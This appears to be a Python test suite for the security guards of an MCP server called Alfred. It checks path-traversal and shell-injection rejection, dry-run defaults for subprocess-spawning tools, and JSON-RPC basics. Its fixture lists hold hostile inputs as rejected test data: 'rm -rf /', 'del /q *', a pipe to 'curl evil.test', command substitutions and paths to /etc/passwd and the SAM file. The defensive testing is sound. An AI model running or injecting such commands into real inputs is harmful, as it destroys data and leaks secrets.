#!/usr/bin/env python3
"""Security + protocol tests for the Alfred MCP server (mcp/alfred-server.js).

The server is reachable by any MCP client, and several of its tools spawn
subprocesses (`run_agent`, `run_workflow`, `launch_script`). That makes its input
guards a real security boundary, so they get real tests:

  * argument sanitising  - path traversal and shell metacharacters are rejected
  * safe defaults        - the spawning tools DRY RUN unless confirm=true, so a
                           client cannot silently spend budget or launch scripts
  * protocol basics      - initialize / tools/list / ping / unknown method

Every test drives the server over real stdio JSON-RPC; nothing is mocked. No test
sets confirm=true, so no model backend is ever spawned.

Run: python scripts/test_mcp_server.py
"""
from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import unittest

REPO_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SERVER = os.path.join(REPO_ROOT, "mcp", "alfred-server.js")
NODE = shutil.which("node")


def rpc(*requests, timeout=90):
    """Send JSON-RPC requests to a fresh server over stdio; return parsed replies.

    One process per call keeps tests independent. The server answers line-by-line
    JSON, so responses are matched back to requests by id.
    """
    payload = "".join(json.dumps(r) + "\n" for r in requests)
    proc = subprocess.run(
        [NODE, SERVER],
        input=payload, capture_output=True, text=True,
        cwd=REPO_ROOT, timeout=timeout, encoding="utf-8", errors="replace",
    )
    replies = {}
    for line in (proc.stdout or "").splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            msg = json.loads(line)
        except ValueError:
            continue
        if "id" in msg:
            replies[msg["id"]] = msg
    return replies


def call_tool(req_id, name, arguments):
    return {"jsonrpc": "2.0", "id": req_id, "method": "tools/call",
            "params": {"name": name, "arguments": arguments}}


def tool_text(reply):
    """Extract the text payload from a successful tools/call reply."""
    return reply["result"]["content"][0]["text"]


@unittest.skipIf(NODE is None, "node is not on PATH")
class ProtocolTests(unittest.TestCase):
    def test_initialize_reports_server_info(self):
        r = rpc({"jsonrpc": "2.0", "id": 1, "method": "initialize"})
        self.assertEqual(r[1]["result"]["serverInfo"]["name"], "alfred")

    def test_tools_list_exposes_thirteen_tools(self):
        r = rpc({"jsonrpc": "2.0", "id": 1, "method": "tools/list"})
        tools = r[1]["result"]["tools"]
        self.assertEqual(len(tools), 13)
        # The dispatch-capable tools must all be present and uniquely named.
        names = {t["name"] for t in tools}
        self.assertEqual(len(names), 13)
        for expected in ("list_workflows", "plan_workflow", "run_workflow",
                         "workflow_runs", "run_agent", "recall_memory", "doctor"):
            self.assertIn(expected, names)

    def test_ping_answers_empty_result(self):
        r = rpc({"jsonrpc": "2.0", "id": 1, "method": "ping"})
        self.assertEqual(r[1]["result"], {})

    def test_unknown_method_is_a_jsonrpc_error(self):
        r = rpc({"jsonrpc": "2.0", "id": 1, "method": "no/such/method"})
        self.assertEqual(r[1]["error"]["code"], -32601)

    def test_malformed_line_does_not_kill_the_server(self):
        # A junk line must be skipped, and a later valid request still answered.
        proc = subprocess.run(
            [NODE, SERVER],
            input="{not json\n" + json.dumps(
                {"jsonrpc": "2.0", "id": 9, "method": "ping"}) + "\n",
            capture_output=True, text=True, cwd=REPO_ROOT, timeout=90,
        )
        self.assertIn('"id":9', (proc.stdout or "").replace(" ", ""))


@unittest.skipIf(NODE is None, "node is not on PATH")
class InputSanitisingTests(unittest.TestCase):
    """safeName()/safeWorkflowPath() are the boundary; prove they hold."""

    TRAVERSAL = [
        "../../../etc/passwd",
        "..\\..\\windows\\system32\\config\\sam",
        "/absolute/path",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "feature.json/../../secret",
    ]
    INJECTION = [
        # These are ATTACK FIXTURES, not commands: each is asserted to be REJECTED
        # by safeName(). Nothing here is ever executed.
        "alfred-coder; rm -rf /",  # safety-lint: allow - rejected-input fixture, never run
        "alfred-coder && del /q *",
        "alfred-coder | curl evil.test",
        "alfred-coder`whoami`",
        "alfred-coder$(whoami)",
        "alfred coder",          # space is not in the allowlist
        "",                       # empty must not resolve to a default
    ]

    def test_plan_workflow_rejects_path_traversal(self):
        reqs = [call_tool(i, "plan_workflow", {"workflow": bad})
                for i, bad in enumerate(self.TRAVERSAL)]
        replies = rpc(*reqs)
        for i, bad in enumerate(self.TRAVERSAL):
            with self.subTest(workflow=bad):
                self.assertIn("error", replies[i],
                              f"traversal was NOT rejected: {bad!r}")

    def test_run_agent_rejects_shell_metacharacters(self):
        reqs = [call_tool(i, "run_agent", {"agent": bad, "task": "x"})
                for i, bad in enumerate(self.INJECTION)]
        replies = rpc(*reqs)
        for i, bad in enumerate(self.INJECTION):
            with self.subTest(agent=bad):
                self.assertIn("error", replies[i],
                              f"injection was NOT rejected: {bad!r}")

    def test_run_workflow_rejects_bad_backend_name(self):
        r = rpc(call_tool(1, "run_workflow",
                          {"workflow": "feature", "task": "x",
                           "backend": "kiro; whoami"}))
        self.assertIn("error", r[1])

    def test_a_legitimate_workflow_name_is_accepted(self):
        # Guards must not be so strict that valid input breaks (no false positives).
        r = rpc(call_tool(1, "plan_workflow", {"workflow": "feature"}))
        self.assertNotIn("error", r[1])
        self.assertIn("feature", tool_text(r[1]).lower())


@unittest.skipIf(NODE is None, "node is not on PATH")
class SafeDefaultTests(unittest.TestCase):
    """The spawning tools must never act for real without confirm=true."""

    def test_run_agent_without_confirm_is_a_dry_run(self):
        r = rpc(call_tool(1, "run_agent",
                          {"agent": "alfred-coder", "task": "say hello"}))
        out = tool_text(r[1])
        self.assertIn("dry", out.lower(),
                      "run_agent must dry-run unless confirm=true")

    def test_run_workflow_without_confirm_is_a_dry_run(self):
        r = rpc(call_tool(1, "run_workflow",
                          {"workflow": "feature", "task": "build a thing"}))
        out = tool_text(r[1])
        self.assertIn("DRY RUN", out)
        self.assertIn("confirm=true", out)

    def test_run_workflow_requires_a_task(self):
        r = rpc(call_tool(1, "run_workflow", {"workflow": "feature", "task": ""}))
        self.assertIn("no task", tool_text(r[1]).lower())

    def test_launcher_tools_are_not_launched_without_confirm(self):
        # trigger_overnight / trigger_train both go through launchScript(), which
        # spawns a detached PowerShell process. Neither may fire without confirm.
        replies = rpc(call_tool(1, "trigger_overnight", {}),
                      call_tool(2, "trigger_train", {}))
        for req_id, tool in ((1, "trigger_overnight"), (2, "trigger_train")):
            with self.subTest(tool=tool):
                out = tool_text(replies[req_id])
                self.assertIn("not launched", out.lower(),
                              f"{tool} must not launch without confirm=true")


if __name__ == "__main__":
    if NODE is None:
        print("SKIP: node is not on PATH", file=sys.stderr)
    unittest.main(verbosity=2)
